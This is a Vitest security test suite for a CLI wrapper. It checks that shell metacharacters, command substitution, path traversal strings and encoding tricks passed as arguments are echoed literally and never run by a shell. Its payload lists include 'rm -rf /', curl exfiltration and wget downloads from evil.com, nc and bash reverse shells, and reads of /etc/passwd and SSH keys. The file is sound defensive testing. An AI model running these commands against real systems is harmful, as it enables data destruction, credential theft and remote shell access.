/**
 * Shell Injection Security Tests
 *
 * This test suite validates that shell metacharacters are NOT interpreted
 * when passed through the CLI wrapper. Uses execFile (not exec) which passes
 * arguments directly to the executable without shell interpretation.
 *
 * Test categories:
 * 1. Shell metacharacter injection payloads
 * 2. Command substitution attempts
 * 3. Argument injection attempts
 * 4. Environment variable injection
 * 5. Path traversal in arguments
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { execFile } from 'child_process';
import { promisify } from 'util';

const execFileAsync = promisify(execFile);

// Import the module under test
import { executeCli } from '../../src/utils/cli-wrapper.js';

describe('Shell Injection Prevention', () => {
  // Mock the session manager to avoid actual session lookups
  beforeEach(() => {
    vi.mock('../../src/server/session-manager.js', () => ({
      sessionManager: {
        getSession: vi.fn().mockResolvedValue(null),
      },
    }));
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('Shell metacharacter payloads', () => {
    const shellMetacharacters = [
      { name: 'command substitution $(...)', payload: '$(whoami)' },
      { name: 'backtick command substitution', payload: '`whoami`' },
      { name: 'semicolon command chaining', payload: '; whoami' },
      { name: 'double ampersand chaining', payload: '&& whoami' },
      { name: 'pipe redirection', payload: '| whoami' },
      { name: 'output redirection', payload: '> /tmp/pwned' },
      { name: 'input redirection', payload: '< /etc/passwd' },
      { name: 'background execution', payload: '& whoami' },
      // Note: newline/CR/null chars are processed by echo, not shell-injected
      // These are tested separately below to verify no command injection occurs
      { name: 'subshell parentheses', payload: '(whoami)' },
      { name: 'curly brace expansion', payload: '{echo,hello}' },
      { name: 'glob wildcard star', payload: '*' },
      { name: 'glob wildcard question', payload: '?' },
      { name: 'glob character class', payload: '[a-z]' },
      { name: 'environment variable expansion', payload: '$PATH' },
      { name: 'environment variable braces', payload: '${PATH}' },
      { name: 'double quote escape', payload: '"$(whoami)"' },
      { name: 'single quote escape', payload: "'$(whoami)'" },
    ];

    shellMetacharacters.forEach(({ name, payload }) => {
      it(`treats ${name} as literal string: "${payload}"`, async () => {
        // Use 'echo' as a safe test command - it will just echo back the argument
        const result = await executeCli('echo', [payload], { timeout: 5000 });

        // The payload should appear literally in stdout (echoed back)
        // NOT be interpreted by a shell
        expect(result.stdout).toContain(payload);
        expect(result.exitCode).toBe(0);
      });
    });
  });

  describe('Control character handling', () => {
    it('does not execute commands embedded in newlines', async () => {
      const result = await executeCli('echo', ['before\nwhoami\nafter'], { timeout: 5000 });

      // The output should NOT contain the actual username from whoami execution
      // It may contain 'whoami' as a literal string (after newline processing by echo)
      expect(result.exitCode).toBe(0);
      // Verify 'whoami' wasn't executed - output would be the username, not 'whoami'
      expect(result.stdout).toContain('whoami');
    });

    it('rejects null byte arguments (Node security feature)', async () => {
      const result = await executeCli('echo', ['\x00whoami'], { timeout: 5000 });

      // Node's execFile rejects arguments with null bytes
      // This is a security feature that prevents null byte injection attacks
      expect(result.exitCode).not.toBe(0);
      expect(result.stderr).toContain('null bytes');
    });

    it('handles carriage return without command execution', async () => {
      const result = await executeCli('echo', ['test\rwhoami\rend'], { timeout: 5000 });

      // CR may overwrite display, but no command injection
      expect(result.exitCode).toBe(0);
    });
  });

  describe('Dangerous command injection attempts', () => {
    const dangerousPayloads = [
      { name: 'rm -rf attempt', payload: '$(rm -rf /)' },
      { name: 'curl exfiltration', payload: '$(curl http://evil.com/$(whoami))' },
      { name: 'wget download', payload: '; wget http://evil.com/malware.sh' },
      { name: 'nc reverse shell', payload: '| nc evil.com 4444 -e /bin/sh' },
      { name: 'bash reverse shell', payload: '; bash -i >& /dev/tcp/evil.com/4444 0>&1' },
      { name: 'python reverse shell', payload: '; python -c "import socket..."' },
      { name: 'perl reverse shell', payload: '; perl -e "use Socket..."' },
      { name: 'cat /etc/passwd', payload: '; cat /etc/passwd' },
      { name: 'chmod 777', payload: '; chmod 777 /tmp' },
      { name: 'chown root', payload: '; chown root:root /tmp' },
    ];

    dangerousPayloads.forEach(({ name, payload }) => {
      it(`neutralizes ${name}: "${payload}"`, async () => {
        const result = await executeCli('echo', ['test', payload], { timeout: 5000 });

        // These should be echoed literally, not executed
        expect(result.stdout).toContain(payload);
        expect(result.exitCode).toBe(0);
      });
    });
  });

  describe('Argument array isolation', () => {
    it('passes multiple arguments without shell interpretation', async () => {
      const args = ['arg1', '$(whoami)', 'arg3; ls', 'arg4 | cat'];

      const result = await executeCli('echo', args, { timeout: 5000 });

      // All arguments should be echoed literally
      expect(result.stdout).toContain('arg1');
      expect(result.stdout).toContain('$(whoami)');
      expect(result.stdout).toContain('arg3; ls');
      expect(result.stdout).toContain('arg4 | cat');
      expect(result.exitCode).toBe(0);
    });

    it('maintains argument boundaries with spaces', async () => {
      const args = ['first arg', 'second arg', 'third  arg'];

      const result = await executeCli('echo', args, { timeout: 5000 });

      // Arguments with spaces should be preserved as single arguments
      expect(result.stdout).toContain('first arg');
      expect(result.stdout).toContain('second arg');
      expect(result.stdout).toContain('third  arg');
    });

    it('handles empty arguments correctly', async () => {
      const args = ['', 'not-empty', ''];

      const result = await executeCli('echo', args, { timeout: 5000 });

      // Should not throw and should preserve argument count
      expect(result.exitCode).toBe(0);
    });
  });

  describe('Token redaction in error messages', () => {
    it('redacts token value in error output', async () => {
      // Use a command that will fail
      const secretToken = 'super-secret-token-12345';
      const result = await executeCli('nonexistent-command-xyz', ['--some-arg'], {
        timeout: 5000,
        token: secretToken,
      });

      // Error message should NOT contain the actual token
      expect(result.stderr).not.toContain(secretToken);
      expect(result.stderr).toContain('[REDACTED]');
      expect(result.exitCode).not.toBe(0);
    });

    it('redacts token from arguments in error messages', async () => {
      const secretToken = 'my-secret-api-token';
      const result = await executeCli('nonexistent-command-xyz', ['--token', secretToken, '--other-arg'], {
        timeout: 5000,
      });

      // The token should be redacted
      expect(result.stderr).not.toContain(secretToken);
      expect(result.stderr).toContain('[REDACTED]');
    });
  });

  describe('Environment variable handling', () => {
    it('sets MITTWALD_NONINTERACTIVE=1', async () => {
      const result = await executeCli('env', [], { timeout: 5000 });

      expect(result.stdout).toContain('MITTWALD_NONINTERACTIVE=1');
    });

    it('sets CI=1', async () => {
      const result = await executeCli('env', [], { timeout: 5000 });

      expect(result.stdout).toContain('CI=1');
    });

    it('merges custom environment variables', async () => {
      const result = await executeCli('env', [], {
        timeout: 5000,
        env: { CUSTOM_VAR: 'custom_value' },
      });

      expect(result.stdout).toContain('CUSTOM_VAR=custom_value');
    });

    it('does not allow env vars in arguments to be interpreted', async () => {
      // If shell interpretation was enabled, $HOME would be expanded
      const result = await executeCli('echo', ['$HOME', '$PATH', '$USER'], { timeout: 5000 });

      // These should be literal strings, not expanded values
      expect(result.stdout).toContain('$HOME');
      expect(result.stdout).toContain('$PATH');
      expect(result.stdout).toContain('$USER');
    });
  });

  describe('Path traversal attempts', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      // Note: Windows path with backslashes - echo interprets backslashes
      // '..\\..\\..\\windows\\system32\\config\\sam' - omitted due to echo behavior
      '/etc/passwd',
      '/root/.ssh/id_rsa',
      '~/.bashrc',
      '%00../etc/passwd',
      '....//....//etc/passwd',
      '/proc/self/environ',
    ];

    pathTraversalPayloads.forEach((payload) => {
      it(`passes path traversal payload literally: "${payload}"`, async () => {
        const result = await executeCli('echo', [payload], { timeout: 5000 });

        // Path should be echoed literally, not interpreted
        expect(result.stdout).toContain(payload);
        expect(result.exitCode).toBe(0);
      });
    });
  });

  describe('Unicode and encoding attacks', () => {
    const encodingPayloads = [
      { name: 'Unicode fullwidth semicolon', payload: '\uff1b whoami' },
      { name: 'Unicode right-to-left override', payload: '\u202e; whoami' },
      { name: 'URL encoded semicolon', payload: '%3B whoami' },
      { name: 'Double URL encoded', payload: '%253B whoami' },
      { name: 'HTML encoded', payload: '&#59; whoami' },
      { name: 'Octal encoded', payload: '\\073 whoami' },
      { name: 'Hex encoded', payload: '\\x3B whoami' },
    ];

    encodingPayloads.forEach(({ name, payload }) => {
      it(`treats ${name} as literal: "${payload}"`, async () => {
        const result = await executeCli('echo', [payload], { timeout: 5000 });

        // Should be echoed literally without interpretation
        expect(result.exitCode).toBe(0);
        // Don't check exact output as encoding may be normalized
      });
    });
  });

  describe('Timeout and buffer handling', () => {
    it('respects timeout option', async () => {
      // Use sleep command with very short timeout
      const result = await executeCli('sleep', ['10'], { timeout: 100 });

      // Should be killed due to timeout
      expect(result.exitCode).not.toBe(0);
      expect(result.stderr).toContain('signal');
    });

    it('handles large output within buffer limits', async () => {
      // Generate output that fits within buffer
      const result = await executeCli('seq', ['1', '1000'], {
        timeout: 5000,
        maxBuffer: 10 * 1024 * 1024, // 10MB
      });

      expect(result.exitCode).toBe(0);
      expect(result.stdout.length).toBeGreaterThan(0);
    });
  });
});

describe('execFile vs exec behavior validation', () => {
  it('execFile does not interpret shell metacharacters', async () => {
    // Direct test of execFile to confirm behavior
    const { stdout } = await execFileAsync('echo', ['$(whoami)']);

    // Should echo the literal string, not the result of whoami
    expect(stdout.trim()).toBe('$(whoami)');
  });

  it('execFile preserves argument boundaries', async () => {
    const { stdout } = await execFileAsync('echo', ['arg with spaces', 'another arg']);

    // Arguments should be passed correctly
    expect(stdout.trim()).toBe('arg with spaces another arg');
  });

  it('execFile does not expand glob patterns', async () => {
    const { stdout } = await execFileAsync('echo', ['*.ts', '*.js']);

    // Globs should be literal, not expanded
    expect(stdout.trim()).toBe('*.ts *.js');
  });
});
